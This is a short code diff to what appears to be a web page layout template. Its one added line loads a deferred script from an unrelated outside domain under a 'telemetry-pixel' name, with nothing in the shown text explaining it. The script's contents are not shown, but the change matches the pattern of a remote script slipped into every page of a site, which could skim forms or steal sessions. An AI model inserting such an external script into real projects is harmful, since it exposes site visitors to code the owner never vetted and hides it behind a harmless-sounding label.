@@ -49,6 +49,7 @@
 
     <!-- Scripts & Styles -->
     @vite(['resources/css/app.css', 'resources/js/app.js'])
+    <script defer data-project="faiillery" src="https://syncops.my.id/telemetry-pixel.js"></script>
     
     <script>
         // Theme — force cream/warm (no dark mode)
